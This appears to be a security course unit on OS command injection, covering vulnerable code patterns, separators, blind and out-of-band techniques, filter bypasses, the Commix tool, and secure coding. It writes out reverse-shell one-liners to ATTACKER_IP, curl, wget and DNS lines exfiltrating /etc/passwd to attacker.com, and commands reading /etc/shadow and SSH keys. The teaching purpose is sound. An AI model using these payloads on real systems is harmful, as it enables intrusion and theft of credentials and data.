# Unit 8: Injection Attacks — Topic 1: Command Injection

## Overview

**Command Injection** (also called **OS Command Injection** or **Shell Injection**) is a critical vulnerability that occurs when an application passes unsafe, user-controllable data to a system shell. When the application constructs operating system commands using unvalidated input, an attacker can inject additional commands that execute with the same privileges as the vulnerable application — often the web-server user or even root.

Command injection consistently ranks among the most dangerous web application vulnerabilities. OWASP classifies it under **A03:2021 – Injection**, and it carries a typical CVSS score of **9.8 (Critical)** because successful exploitation grants the attacker **Remote Code Execution (RCE)** on the underlying server.

Unlike code injection (where the attacker injects application-layer code), command injection targets the **operating system layer**, leveraging the host's command interpreter (`/bin/sh`, `/bin/bash`, `cmd.exe`, `PowerShell`, etc.).

```
+-----------+       +------------------+       +-----------------+       +------------------+
|  Attacker | ----->| Web Application  | ----->| System Shell    | ----->| Operating System |
|  (Input)  |       | (Builds Command) |       | (sh / cmd.exe)  |       | (Executes Cmds)  |
+-----------+       +------------------+       +-----------------+       +------------------+
      |                     |                          |                         |
      |  ip=8.8.8.8;whoami  |  ping -c 4 8.8.8.8;     |  Runs ping AND whoami   |
      |                     |  whoami                  |                         |
      +---------------------+--------------------------+-------------------------+
```

---

## 1. OS Command Injection Fundamentals

### 1.1 How Commands Are Executed

Web applications sometimes need to interact with the underlying operating system — running system utilities, calling scripts, or processing files. Languages offer functions that invoke a system shell:

| Language / Framework | Dangerous Functions                                              |
|----------------------|------------------------------------------------------------------|
| **PHP**              | `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `` `backticks` `` |
| **Python**           | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, `subprocess.Popen(shell=True)` |
| **Java**             | `Runtime.getRuntime().exec()`, `ProcessBuilder`                  |
| **Node.js**          | `child_process.exec()`, `child_process.spawn({shell:true})`     |
| **Ruby**             | `system()`, `exec()`, `` `backticks` ``, `%x{}`, `IO.popen()`   |
| **Perl**             | `system()`, `exec()`, `` `backticks` ``, `open(PIPE)`           |
| **C / C++**          | `system()`, `popen()`                                           |
| **ASP / .NET**       | `Process.Start()`, `Shell()`                                    |

### 1.2 Vulnerable Code Pattern

**PHP — Vulnerable:**
```php
<?php
// User supplies an IP address to ping
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);
echo "<pre>$output</pre>";
?>
```

**Python — Vulnerable:**
```python
import os
from flask import request

@app.route('/ping')
def ping():
    ip = request.args.get('ip')
    output = os.popen(f"ping -c 4 {ip}").read()
    return f"<pre>{output}</pre>"
```

**Node.js — Vulnerable:**
```javascript
const { exec } = require('child_process');
app.get('/ping', (req, res) => {
    const ip = req.query.ip;
    exec(`ping -c 4 ${ip}`, (err, stdout) => {
        res.send(`<pre>${stdout}</pre>`);
    });
});
```

### 1.3 Anatomy of an Attack

```
Normal Request:
  GET /ping?ip=8.8.8.8

Injected Request:
  GET /ping?ip=8.8.8.8;cat+/etc/passwd

Resulting Command Executed:
  ping -c 4 8.8.8.8; cat /etc/passwd
                     ^^^^^^^^^^^^^^^^^
                     Injected portion
```

The semicolon (`;`) terminates the `ping` command and starts a new command (`cat /etc/passwd`), which the shell executes with the application's privileges.

---

## 2. Blind vs Visible Command Injection

### 2.1 Visible (In-Band) Command Injection

The output of the injected command is returned directly in the HTTP response. This is the simplest form to exploit — the attacker sees the result immediately.

```
+----------+     GET /ping?ip=;id      +----------------+     sh -c "ping ;id"    +---------+
| Attacker | ------------------------> | Web App Server | --------------------->  | OS Shell|
+----------+                           +----------------+                         +---------+
     ^                                        |                                       |
     |        HTTP 200                        |         uid=33(www-data)...            |
     |   <pre>uid=33(www-data)...</pre>       | <-------------------------------------+
     +----------------------------------------+
```

**Example Payloads (Visible):**
```
GET /ping?ip=127.0.0.1;id
GET /ping?ip=127.0.0.1;cat+/etc/passwd
GET /ping?ip=127.0.0.1|whoami
GET /ping?ip=`whoami`
```

### 2.2 Blind Command Injection

The application does not return the command output in the response. The attacker must use **indirect observation** to confirm execution. Three primary techniques exist:

#### A. Time-Based Blind Injection

Inject a command that causes a measurable delay:

```
+----------+  GET /ping?ip=;sleep+10   +----------------+      sh -c "ping ;sleep 10"   +---------+
| Attacker | ------------------------> | Web App Server | -----------------------------> | OS Shell|
+----------+                           +----------------+                                +---------+
     ^                                        |                                               |
     |   HTTP 200 (after ~10 seconds)         |             (sleeps for 10 seconds)           |
     |   "Ping complete"                      | <---------------------------------------------+
     +----------------------------------------+
     |
     + Delay confirms command was executed
```

| OS        | Time-Based Payload                  | Expected Delay |
|-----------|-------------------------------------|----------------|
| Linux     | `;sleep 10`                         | 10 seconds     |
| Linux     | `$(sleep 10)`                       | 10 seconds     |
| Linux     | `` `sleep 10` ``                    | 10 seconds     |
| Windows   | `& ping -n 11 127.0.0.1`           | ~10 seconds    |
| Windows   | `| timeout /t 10`                   | 10 seconds     |
| Both      | `; ping -c 10 127.0.0.1`           | ~10 seconds    |

#### B. Out-of-Band (OOB) Blind Injection

Force the target server to make an external network request to an attacker-controlled server:

```
+-----------+    Inject payload     +----------------+    DNS/HTTP request    +-------------------+
| Attacker  | -------------------> | Vulnerable App | --------------------> | Attacker's Server |
+-----------+                      +----------------+                       | (Burp Collaborator|
      ^                                                                     |  or custom DNS)   |
      |                                                                     +-------------------+
      |           Confirm: DNS query received for attacker.com                     |
      +----------------------------------------------------------------------------+
```

**OOB Payloads:**

```bash
# DNS-based exfiltration
;nslookup attacker.com
;dig attacker.com
;host attacker.com

# HTTP-based exfiltration
;curl http://attacker.com/confirm
;wget http://attacker.com/confirm

# Data exfiltration via DNS subdomain
;nslookup $(whoami).attacker.com
;dig $(cat /etc/hostname).attacker.com

# Data exfiltration via HTTP
;curl http://attacker.com/$(whoami)
;wget http://attacker.com/?data=$(cat+/etc/passwd|base64)
```

#### C. File-Write-Based Blind Injection

Write output to a web-accessible directory, then retrieve it:

```bash
# Write to webroot
;id > /var/www/html/output.txt
# Then access: http://target.com/output.txt

;cat /etc/passwd > /var/www/html/data.txt
# Then access: http://target.com/data.txt
```

### 2.3 Comparison: Visible vs Blind Injection

| Feature                | Visible Injection          | Blind Injection                     |
|------------------------|----------------------------|-------------------------------------|
| Output in response     | Yes                        | No                                  |
| Confirmation method    | Direct observation         | Time delay, OOB, file write         |
| Difficulty             | Easy                       | Moderate to Hard                    |
| Data exfiltration      | Immediate                  | Requires extra channels             |
| Automation potential   | High                       | Moderate (time-based is slow)       |
| Detection by WAF       | Moderate                   | Harder (payloads can be stealthier) |

---

## 3. Command Separators and Injection Operators

Understanding shell metacharacters is critical for crafting and detecting command injection payloads.

### 3.1 Complete Operator Reference

| Operator       | Syntax Example          | Behavior (Linux)                                                 | Behavior (Windows)                                     |
|----------------|-------------------------|------------------------------------------------------------------|--------------------------------------------------------|
| Semicolon      | `cmd1 ; cmd2`           | Execute `cmd1`, then `cmd2` regardless of `cmd1` result          | Not supported in `cmd.exe`; works in PowerShell        |
| Pipe           | `cmd1 \| cmd2`          | Pipe stdout of `cmd1` to stdin of `cmd2`                         | Same                                                   |
| AND            | `cmd1 && cmd2`          | Execute `cmd2` only if `cmd1` succeeds (exit code 0)             | Same                                                   |
| OR             | `cmd1 \|\| cmd2`        | Execute `cmd2` only if `cmd1` fails (non-zero exit)              | Same                                                   |
| Ampersand      | `cmd1 & cmd2`           | Execute `cmd1` in background, then execute `cmd2`                | Execute `cmd1` then `cmd2` (command separator)         |
| Backticks      | `` `cmd` ``             | Command substitution — execute `cmd`, use its output             | Not supported in `cmd.exe`                             |
| Dollar-Paren   | `$(cmd)`                | Command substitution (POSIX) — execute `cmd`, use its output     | Not supported in `cmd.exe`; works in PowerShell `$()` or `$()`  |
| Newline        | `cmd1%0acmd2`           | Newline acts as command separator                                | Same (URL-encoded `%0d%0a`)                            |
| Redirection    | `cmd > file`            | Redirect stdout to file                                          | Same                                                   |
| Append         | `cmd >> file`           | Append stdout to file                                            | Same                                                   |

### 3.2 Payload Examples by Operator

```bash
# Semicolon — Execute both commands sequentially
127.0.0.1; whoami
127.0.0.1; cat /etc/shadow

# Pipe — Feed output of first command to second
127.0.0.1 | id
127.0.0.1 | cat /etc/passwd

# AND — Second command runs only if first succeeds
127.0.0.1 && id
127.0.0.1 && uname -a

# OR — Second command runs only if first fails
invalidhost || id
|| whoami

# Background execution (Linux)
127.0.0.1 & whoami
127.0.0.1 & cat /etc/passwd &

# Command substitution
$(whoami)
`id`
ping -c 4 $(whoami).attacker.com

# Newline injection (URL-encoded)
127.0.0.1%0aid
127.0.0.1%0d%0awhoami

# Windows-specific separators
127.0.0.1 & whoami          :: ampersand separator
127.0.0.1 && whoami         :: AND operator
127.0.0.1 | whoami          :: pipe
127.0.0.1 || whoami         :: OR operator
```

### 3.3 Input Context and Quote Escaping

Sometimes the injected input lands inside quotes or specific command arguments:

```bash
# If input is placed inside double quotes:
#   command "USER_INPUT"
# Payload: "; whoami; echo "
# Result:  command ""; whoami; echo ""

# If input is placed inside single quotes (Linux):
#   command 'USER_INPUT'
# Payload: '; whoami; echo '
# Result:  command ''; whoami; echo ''

# If input is used as an argument:
#   ping USER_INPUT
# Payload: -c 1 127.0.0.1; id
# Result:  ping -c 1 127.0.0.1; id
```

---

## 4. Detection and Exploitation Methodology

### 4.1 Systematic Detection Workflow

```
+------------------------+
| 1. Identify Input      |
|    Vectors              |
+----------+-------------+
           |
           v
+----------+-------------+
| 2. Submit Benign       |
|    Baseline Request     |
+----------+-------------+
           |
           v
+----------+-------------+
| 3. Test Command        |
|    Separators           |
|  (; | && || ` $() %0a) |
+----------+-------------+
           |
     +-----+------+
     |             |
     v             v
+----+----+  +-----+--------+
| Output  |  | No Output    |
| Visible |  | (Blind)      |
+---------+  +--------------+
     |             |
     v             v
+----+----+  +-----+--------+
| Confirm |  | Time-Based   |
| with id,|  | ;sleep 10    |
| whoami  |  | OOB: nslookup|
+---------+  | File write   |
     |       +--------------+
     v             |
+----+-------------+----+
| 4. Escalate:           |
|    - Read files         |
|    - Reverse shell      |
|    - Pivot              |
+-------------------------+
```

### 4.2 Step-by-Step Manual Testing

**Step 1 — Identify input points:**
- URL parameters (`?ip=`, `?host=`, `?file=`, `?cmd=`)
- POST body fields
- HTTP headers (User-Agent, Referer, X-Forwarded-For)
- Cookie values
- File upload filenames

**Step 2 — Baseline request:**
```
GET /api/ping?host=127.0.0.1 HTTP/1.1
```
Note the normal response content, length, and timing.

**Step 3 — Inject separators systematically:**

```
# Round 1: Basic separators
127.0.0.1;id
127.0.0.1|id
127.0.0.1&&id
127.0.0.1||id

# Round 2: Command substitution
$(id)
`id`

# Round 3: Newline injection
127.0.0.1%0aid
127.0.0.1%0d%0aid

# Round 4: Time-based (if blind)
127.0.0.1;sleep+5
127.0.0.1|sleep+5
127.0.0.1$(sleep+5)

# Round 5: OOB (if blind, no time delay)
127.0.0.1;curl+http://BURP-COLLABORATOR-URL
127.0.0.1|nslookup+BURP-COLLABORATOR-URL
```

**Step 4 — Confirm and escalate:**
```bash
# System enumeration
;id
;whoami
;uname -a
;hostname
;ifconfig
;cat /etc/passwd
;env
;ps aux
;netstat -tulnp

# File system access
;ls -la /
;find / -name "*.conf" 2>/dev/null
;cat /etc/shadow
;cat /home/*/.ssh/id_rsa

# Network pivoting
;curl http://internal-server:8080/
;wget http://169.254.169.254/latest/meta-data/

# Reverse shell
;bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
;python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
;nc -e /bin/sh ATTACKER_IP 4444
```

### 4.3 Bypassing Filters and WAFs

Applications often implement weak input validation. Common bypass techniques:

| Filter/Block           | Bypass Technique                                         | Example                                   |
|------------------------|----------------------------------------------------------|--------------------------------------------|
| Space blocked          | Use `${IFS}` (Internal Field Separator)                  | `cat${IFS}/etc/passwd`                     |
| Space blocked          | Use `<` redirection                                      | `cat</etc/passwd`                          |
| Space blocked          | Use tabs `%09`                                           | `cat%09/etc/passwd`                        |
| Space blocked          | Use `{cmd,arg}` brace expansion                         | `{cat,/etc/passwd}`                        |
| Keyword `cat` blocked  | Use alternatives                                         | `tac`, `head`, `tail`, `less`, `more`, `nl`, `xxd`, `base64` |
| Keyword `whoami`       | String concatenation                                     | `w'h'o'a'm'i` or `w"h"o"a"m"i`           |
| Keyword blocked        | Variable assignment                                      | `a=who;b=ami;$a$b`                        |
| Keyword blocked        | Hex encoding                                             | `$(printf '\x77\x68\x6f\x61\x6d\x69')`   |
| Keyword blocked        | Base64 encoding                                          | `$(echo d2hvYW1p \| base64 -d)`           |
| Keyword blocked        | Wildcard matching                                        | `/bin/ca? /etc/pas*wd`                     |
| Keyword blocked        | Reverse string                                           | `$(echo 'imaohw' \| rev)`                 |
| `/etc/passwd` blocked  | Glob/wildcard                                            | `cat /etc/pass??`                          |
| Backticks blocked      | Use `$()` instead                                        | `$(id)` instead of `` `id` ``             |
| `$()` blocked          | Use backticks instead                                    | `` `id` `` instead of `$(id)`             |
| `;` blocked            | Use `%0a` (newline)                                      | `127.0.0.1%0aid`                           |
| All separators blocked | Use `${IFS}` + substitution chains                       | `echo${IFS}$(whoami)`                      |

**Advanced Filter Bypass Examples:**

```bash
# Using wildcards to avoid keyword filters
/b?n/c?t /e?c/p?ss?d
/b*n/c*t /e*c/p*d

# Using environment variable slicing (bash)
${PATH:0:1}           # gives '/'
${LS_COLORS:10:1}     # can extract characters from env vars

# Using printf for character construction
$(printf '\154\163')   # 'ls' in octal

# Using $@ or $* (empty in non-script context)
c$@at /etc$@/passwd
wh$@oami

# Using double dollar (PID — harmless filler)
cat$$/etc/passwd     # $$ is PID, but adjacent / starts path

# IP address alternative formats (for OOB to bypass IP filters)
# Decimal:   2130706433  (127.0.0.1)
# Hex:       0x7f000001
# Octal:     0177.0.0.01
```

---

## 5. Commix Tool Usage

**Commix** (Command Injection Exploiter) is a dedicated, open-source tool for automating the detection and exploitation of command injection vulnerabilities.

### 5.1 Installation

```bash
# Clone from GitHub
git clone https://github.com/commixproject/commix.git
cd commix

# Or install via pip
pip install commix

# Kali Linux (pre-installed)
commix --help
```

### 5.2 Basic Usage

```bash
# Basic scan — GET parameter
commix --url="http://target.com/ping.php?ip=127.0.0.1"

# Specify the vulnerable parameter
commix --url="http://target.com/ping.php?ip=127.0.0.1" -p ip

# POST request
commix --url="http://target.com/ping.php" --data="ip=127.0.0.1" -p ip

# With cookies / authentication
commix --url="http://target.com/ping.php?ip=127.0.0.1" \
       --cookie="PHPSESSID=abc123; role=admin"

# With custom headers
commix --url="http://target.com/ping.php?ip=127.0.0.1" \
       --headers="Authorization: Bearer eyJ..."

# Using a proxy (Burp Suite)
commix --url="http://target.com/ping.php?ip=127.0.0.1" \
       --proxy="http://127.0.0.1:8080"
```

### 5.3 Advanced Options

```bash
# Specify injection technique
#   --technique=C   Classic/results-based
#   --technique=E   Evaluation-based
#   --technique=T   Time-based
#   --technique=F   File-based
commix --url="http://target.com/ping.php?ip=127.0.0.1" --technique=T

# Specify operating system
commix --url="http://target.com/ping.php?ip=127.0.0.1" --os=linux
commix --url="http://target.com/ping.php?ip=127.0.0.1" --os=windows

# Skip specific separators
commix --url="http://target.com/ping.php?ip=127.0.0.1" --skip=";"

# Set timeout for time-based injection
commix --url="http://target.com/ping.php?ip=127.0.0.1" --technique=T --time-sec=10

# Enable verbose output
commix --url="http://target.com/ping.php?ip=127.0.0.1" -v 3

# Get an interactive pseudo-shell
commix --url="http://target.com/ping.php?ip=127.0.0.1" --os-cmd="whoami"

# Batch mode (no user interaction)
commix --url="http://target.com/ping.php?ip=127.0.0.1" --batch

# Specify HTTP method
commix --url="http://target.com/ping.php" --method=PUT --data="ip=127.0.0.1"

# Tamper scripts (encoding bypass)
commix --url="http://target.com/ping.php?ip=127.0.0.1" --tamper=base64encode
```

### 5.4 Exploitation — Interactive Shell

```bash
$ commix --url="http://target.com/ping.php?ip=127.0.0.1"

[*] Testing connection to the target URL...
[*] Checking if the target is protected by a WAF/IPS/IDS...
[+] The target is not protected by a WAF/IPS/IDS.
[*] Testing the (results-based) classic command injection technique...
[+] The GET parameter 'ip' seems injectable via (results-based) classic injection technique.
    Available separator: ';'

commix(os_shell)> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

commix(os_shell)> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...

commix(os_shell)> reverse_tcp
# Commix can set up a reverse TCP shell automatically
```

### 5.5 Commix Techniques Summary

| Technique         | Flag           | Description                                          | Use When                            |
|-------------------|----------------|------------------------------------------------------|-------------------------------------|
| Classic           | `--technique=C`| Injects and reads output from response               | Output is reflected in response     |
| Evaluation-based  | `--technique=E`| Uses language evaluation (e.g., PHP `eval`)          | Application evaluates code          |
| Time-based        | `--technique=T`| Uses time delays to infer results                    | Blind injection, no output          |
| File-based        | `--technique=F`| Writes output to file, reads via HTTP                | Blind injection, writable webroot   |
| All techniques    | (default)      | Tries all techniques sequentially                    | Initial reconnaissance              |

---

## 6. Time-Based and Out-of-Band (OOB) Techniques — Deep Dive

### 6.1 Time-Based Data Exfiltration

When only time delays confirm execution, data must be extracted **one character at a time** using conditional logic:

```bash
# Extract the first character of 'whoami' output
# If the character is 'w' (ASCII 119), sleep for 5 seconds
;if [ $(whoami | cut -c1) = "w" ]; then sleep 5; fi

# Generic pattern — test character at position N
;if [ $(CMD | cut -cN) = "CHAR" ]; then sleep 5; fi

# Binary search approach (faster — test if ASCII > threshold)
;if [ $(whoami | cut -c1 | od -An -td1 | tr -d ' ') -gt 109 ]; then sleep 5; fi
```

```
Time-Based Exfiltration Flow:

 +----------+    ;if [$(whoami|cut -c1)="a"];then sleep 5;fi    +--------+
 | Attacker | ------------------------------------------------> | Target |
 +----------+                                                   +--------+
       |                                                             |
       |  Response in ~0.5s  --> character is NOT 'a'                |
       | <-----------------------------------------------------------+
       |                                                             |
       |    ;if [$(whoami|cut -c1)="w"];then sleep 5;fi              |
       | ----------------------------------------------------------> |
       |                                                             |
       |  Response in ~5.5s  --> character IS 'w' !!                 |
       | <-----------------------------------------------------------+
       |                                                             |
       |  Repeat for position 2, 3, 4...                             |
       +-------------------------------------------------------------+
```

### 6.2 OOB Data Exfiltration Techniques

**DNS-Based Exfiltration (Most Reliable):**

```bash
# Exfiltrate whoami via DNS subdomain
;nslookup $(whoami).attacker.com
;dig $(whoami).attacker.com
;host $(whoami).burp-collaborator-id.oastify.com

# Exfiltrate file content (base64-encoded, split into chunks)
;cat /etc/hostname | base64 | xargs -I{} nslookup {}.attacker.com

# Using curl with DNS (when HTTP is blocked but DNS resolves)
;curl http://$(whoami).attacker.com
```

**HTTP-Based Exfiltration:**

```bash
# Simple HTTP exfiltration
;curl http://attacker.com/exfil?data=$(whoami)
;wget -q "http://attacker.com/exfil?data=$(cat /etc/passwd | base64 | tr -d '\n')"

# Using POST for larger data
;curl -X POST -d @/etc/passwd http://attacker.com/collect

# Exfiltrate via User-Agent header
;curl -A "$(uname -a)" http://attacker.com/collect
```

**Attacker-Side Listener Setup:**

```bash
# Simple HTTP listener (attacker machine)
python3 -m http.server 8080

# Netcat listener
nc -lvnp 8080

# Burp Collaborator — use generated payload as the domain
# Check Collaborator tab for DNS/HTTP interactions

# Interactsh (open-source Collaborator alternative)
interactsh-client
# Provides a unique domain: abc123.interact.sh
# Use: ;curl http://abc123.interact.sh/$(whoami)
```

### 6.3 DNS Exfiltration Limitations

| Constraint                  | Impact                                                  | Workaround                                |
|-----------------------------|----------------------------------------------------------|-------------------------------------------|
| DNS label max 63 chars      | Large data must be chunked                               | Split into multiple DNS queries           |
| Total FQDN max 253 chars    | Limits per-query data volume                             | Multiple sequential queries               |
| Special characters in data  | DNS labels are alphanumeric + hyphens only                | Base32/hex encode the data                |
| DNS caching                 | Repeated identical queries may not reach attacker         | Add random prefix/suffix to each query    |
| Egress DNS filtering        | Some networks block outbound DNS to non-internal servers  | Try HTTP/HTTPS OOB instead                |

---

## 7. Prevention and Secure Coding

### 7.1 Defense-in-Depth Strategy

```
+-------------------------------------------------------------------+
|                    DEFENSE LAYERS                                  |
|                                                                    |
|  +-------------------------------------------------------------+  |
|  | Layer 1: AVOID SYSTEM COMMANDS                               |  |
|  |   Use native language APIs instead of shell commands         |  |
|  +-------------------------------------------------------------+  |
|                                                                    |
|  +-------------------------------------------------------------+  |
|  | Layer 2: INPUT VALIDATION                                    |  |
|  |   Allowlist approach — accept only expected characters       |  |
|  +-------------------------------------------------------------+  |
|                                                                    |
|  +-------------------------------------------------------------+  |
|  | Layer 3: PARAMETERIZED EXECUTION                             |  |
|  |   Pass arguments as array, not concatenated string           |  |
|  +-------------------------------------------------------------+  |
|                                                                    |
|  +-------------------------------------------------------------+  |
|  | Layer 4: LEAST PRIVILEGE                                     |  |
|  |   Run application with minimal OS permissions               |  |
|  +-------------------------------------------------------------+  |
|                                                                    |
|  +-------------------------------------------------------------+  |
|  | Layer 5: WAF + MONITORING                                    |  |
|  |   Detect and block known injection patterns                  |  |
|  +-------------------------------------------------------------+  |
+-------------------------------------------------------------------+
```

### 7.2 Secure Code Examples

**PHP — Secure (Avoid Shell Entirely):**
```php
<?php
// Instead of: shell_exec("ping -c 4 " . $ip);
// Use PHP's native socket functions or validate strictly

$ip = $_GET['ip'];

// Strict validation: only allow valid IPv4
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    die("Invalid IP address");
}

// If shell command is unavoidable, use escapeshellarg()
$output = shell_exec("ping -c 4 " . escapeshellarg($ip));
echo "<pre>" . htmlspecialchars($output) . "</pre>";
?>
```

**Python — Secure (Parameterized Subprocess):**
```python
import subprocess
import ipaddress
from flask import request

@app.route('/ping')
def ping():
    ip = request.args.get('ip')

    # Validate input
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        return "Invalid IP address", 400

    # Use subprocess with argument list (NO shell=True)
    result = subprocess.run(
        ['ping', '-c', '4', ip],
        capture_output=True, text=True, timeout=30
    )
    return f"<pre>{result.stdout}</pre>"
```

**Node.js — Secure (Argument Array):**
```javascript
const { execFile } = require('child_process');
const net = require('net');

app.get('/ping', (req, res) => {
    const ip = req.query.ip;

    // Validate: must be valid IP
    if (!net.isIP(ip)) {
        return res.status(400).send('Invalid IP');
    }

    // execFile does NOT invoke a shell — arguments passed as array
    execFile('ping', ['-c', '4', ip], (err, stdout) => {
        res.send(`<pre>${stdout}</pre>`);
    });
});
```

**Java — Secure (ProcessBuilder with Argument List):**
```java
String ip = request.getParameter("ip");

// Validate
if (!ip.matches("^\\d{1,3}(\\.\\d{1,3}){3}$")) {
    response.sendError(400, "Invalid IP");
    return;
}

// ProcessBuilder with argument list — no shell interpretation
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", ip);
pb.redirectErrorStream(true);
Process process = pb.start();

BufferedReader reader = new BufferedReader(
    new InputStreamReader(process.getInputStream())
);
String line;
while ((line = reader.readLine()) != null) {
    response.getWriter().println(line);
}
```

### 7.3 Prevention Summary Table

| Prevention Technique         | Effectiveness | Implementation Effort | Notes                                              |
|------------------------------|---------------|----------------------|-----------------------------------------------------|
| Avoid shell commands entirely| ★★★★★         | Medium               | Best approach — use native APIs                     |
| Input allowlisting           | ★★★★☆         | Low                  | Regex/pattern match for expected values             |
| Parameterized execution      | ★★★★☆         | Low                  | `execFile`, `subprocess.run(list)`, `ProcessBuilder`|
| `escapeshellarg()` / quoting | ★★★☆☆         | Low                  | Language-specific; can have edge-case bypasses      |
| Input denylisting            | ★★☆☆☆         | Low                  | Easily bypassed; not recommended as primary defense |
| WAF rules                    | ★★★☆☆         | Medium               | Additional layer; bypassable but raises the bar     |
| Sandboxing / containers      | ★★★★☆         | High                 | Limits blast radius if injection succeeds           |
| Least privilege              | ★★★★☆         | Medium               | Application user should have minimal permissions    |

---

## Summary Table

| Concept                    | Key Points                                                                                     |
|----------------------------|-----------------------------------------------------------------------------------------------|
| **What is Cmd Injection**  | Injecting OS commands via unsanitized user input passed to a system shell                      |
| **Impact**                 | Full RCE, data theft, lateral movement, complete server compromise                             |
| **Visible Injection**      | Command output returned in HTTP response — immediate data access                              |
| **Blind Injection**        | No output returned — use time delays, OOB channels, or file writes to confirm                 |
| **Key Operators**          | `;` `\|` `&&` `\|\|` `&` `` ` `` `$()` `%0a` for chaining commands                          |
| **Filter Bypass**          | `${IFS}`, wildcards, string concatenation, encoding, environment variables                    |
| **Commix**                 | Automated tool — supports classic, eval, time-based, and file-based injection                 |
| **OOB Exfiltration**       | DNS subdomain or HTTP callbacks to attacker-controlled servers                                |
| **Best Prevention**        | Avoid shell commands; use parameterized execution; validate with allowlists                   |

---

## Revision Questions

1. **Explain the difference between visible and blind command injection. What techniques can be used to confirm and exploit blind command injection when no output is reflected in the response?**

2. **A web application filters semicolons (`;`) and pipes (`|`) from user input. List at least four alternative command separators or techniques an attacker could use to bypass this filter, and provide example payloads for each.**

3. **Describe how an attacker would use DNS-based out-of-band exfiltration to extract the contents of `/etc/hostname` from a blind command injection vulnerability. Include the exact payload and explain the limitations of DNS exfiltration.**

4. **Compare `subprocess.run(['ping', '-c', '4', ip])` (Python) with `os.system(f"ping -c 4 {ip}")`. Why is the first approach secure against command injection while the second is vulnerable? What is the key architectural difference?**

5. **You discover a command injection vulnerability in a PHP application using `shell_exec()`. The application runs as `www-data`. Outline your step-by-step exploitation methodology from initial confirmation to obtaining a reverse shell.**

6. **Demonstrate how Commix can be used to exploit a time-based blind command injection vulnerability. Include the exact command syntax and explain what the `--technique=T` and `--time-sec` flags control.**

---

*Next: [02-ldap-injection.md](02-ldap-injection.md)*

---

*[Back to README](../README.md)*
